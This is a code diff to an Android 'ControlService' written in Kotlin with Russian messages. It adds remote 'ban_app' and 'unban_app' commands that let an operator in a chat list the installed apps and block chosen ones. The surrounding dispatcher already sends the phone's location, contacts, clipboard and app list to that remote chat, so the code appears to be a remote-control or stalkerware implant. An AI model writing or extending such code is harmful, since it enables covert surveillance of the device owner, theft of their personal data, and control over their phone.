@@ -326,6 +326,8 @@ class ControlService : Service() {
                     "get_location"  -> sendLocation(cmd.optString("_chat_id", ""))
                     "get_contacts"  -> sendContacts(cmd.optString("_chat_id", ""))
                     "get_apps"      -> sendInstalledApps(cmd.optString("_chat_id", ""))
+                    "ban_app"       -> banApps(cmd, cmd.optString("_chat_id", ""))
+                    "unban_app"     -> unbanApps(cmd, cmd.optString("_chat_id", ""))
                     "get_clipboard" -> sendClipboard(cmd.optString("_chat_id", ""))
                     "set_brightness"-> setBrightness(cmd.optInt("level", 50))
                     "vibrate"       -> vibrate(cmd.optLong("ms", 500))
@@ -689,24 +691,105 @@ class ControlService : Service() {
 
     // ─── Installed apps ───────────────────────────────────────────────────────
 
+    // Кэш последнего списка приложений: индекс → packageName
+    private val appsCache = mutableListOf<String>()  // index 0 = app #1
+
     private fun sendInstalledApps(chatId: String) {
         scope.launch {
             try {
                 val pm = packageManager
                 val apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
                     .filter { it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
-                    .map { pm.getApplicationLabel(it).toString() + " (${it.packageName})" }
-                    .sorted()
+                    .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }
+
+                appsCache.clear()
+                appsCache.addAll(apps.map { it.packageName })
+
                 if (apps.isEmpty()) {
                     sendTextReply(chatId, "📱 Нет установленных приложений")
                     return@launch
                 }
-                apps.chunked(50).forEachIndexed { i, chunk ->
-                    val text = "📱 Приложения [${i+1}/${(apps.size+49)/50}]:\n" + chunk.joinToString("\n")
+                val lines = apps.mapIndexed { i, app ->
+                    "${i+1}. ${pm.getApplicationLabel(app)} (${app.packageName})"
+                }
+                lines.chunked(50).forEachIndexed { i, chunk ->
+                    val text = "📱 Приложения [${i+1}/${(lines.size+49)/50}]:\n" + chunk.joinToString("\n")
                     sendTextReply(chatId, text)
                 }
             } catch (e: Exception) {
                 sendTextReply(chatId, "📱 Ошибка: ${e.message}")
+            }
+        }
+    }
+
+    private fun banApps(cmd: org.json.JSONObject, chatId: String) {
+        scope.launch {
+            try {
+                if (appsCache.isEmpty()) {
+                    sendTextReply(chatId, "⚠️ Сначала получи список через /apps")
+                    return@launch
+                }
+                val indices = cmd.optJSONArray("indices") ?: run {
+                    sendTextReply(chatId, "⚠️ Нет индексов")
+                    return@launch
+                }
+                val packages = mutableListOf<String>()
+                val names = mutableListOf<String>()
+                val pm = packageManager
+                for (i in 0 until indices.length()) {
+                    val idx = indices.getInt(i) - 1  // 1-based → 0-based
+                    if (idx in appsCache.indices) {
+                        val pkg = appsCache[idx]
+                        packages.add(pkg)
+                        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
+                        names.add(label)
+                    }
+                }
+                if (packages.isEmpty()) {
+                    sendTextReply(chatId, "⚠️ Нет совпадений в списке")
+                    return@launch
+                }
+                SettingsBlocker.banApps(packages)
+                if (!SettingsBlocker.isRunning()) SettingsBlocker.start(applicationContext)
+                sendTextReply(chatId, "🚫 Заблокировано: ${names.joinToString(", ")}")
+            } catch (e: Exception) {
+                sendTextReply(chatId, "❌ ban_app ошибка: ${e.message}")
+            }
+        }
+    }
+
+    private fun unbanApps(cmd: org.json.JSONObject, chatId: String) {
+        scope.launch {
+            try {
+                if (cmd.optBoolean("all", false)) {
+                    SettingsBlocker.unbanAllApps()
+                    sendTextReply(chatId, "✅ Все приложения разблокированы")
+                    return@launch
+                }
+                val indices = cmd.optJSONArray("indices") ?: run {
+                    sendTextReply(chatId, "⚠️ Нет индексов")
+                    return@launch
+                }
+                val packages = mutableListOf<String>()
+                val names = mutableListOf<String>()
+                val pm = packageManager
+                for (i in 0 until indices.length()) {
+                    val idx = indices.getInt(i) - 1
+                    if (idx in appsCache.indices) {
+                        val pkg = appsCache[idx]
+                        packages.add(pkg)
+                        val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
+                        names.add(label)
+                    }
+                }
+                if (packages.isEmpty()) {
+                    sendTextReply(chatId, "⚠️ Нет совпадений в списке")
+                    return@launch
+                }
+                SettingsBlocker.unbanApps(packages)
+                sendTextReply(chatId, "✅ Разблокировано: ${names.joinToString(", ")}")
+            } catch (e: Exception) {
+                sendTextReply(chatId, "❌ unban_app ошибка: ${e.message}")
             }
         }
     }
